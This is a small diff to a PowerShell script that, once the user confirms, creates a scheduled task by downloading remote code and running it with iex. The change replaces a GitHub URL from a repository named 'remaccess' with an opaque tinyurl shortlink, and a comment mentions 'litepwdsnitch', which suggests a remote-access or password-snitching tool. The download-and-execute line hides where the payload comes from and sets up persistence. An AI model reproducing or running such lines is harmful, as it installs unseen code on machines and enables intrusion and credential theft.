@@ -26,7 +26,7 @@ if ([string]::IsNullOrEmpty($opconfirm)) {
 }
 if ($opconfirm.ToLower() -eq "y") {
 	Write-Host "Creating the task"
- 	powershell.exe irm https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1 | iex
+ 	powershell.exe iex(iwr -Uri https://tinyurl.com/taskschedulersetup -UseBasicParsing).Content
   } else {
 }
 #litepwdsnitch Fix
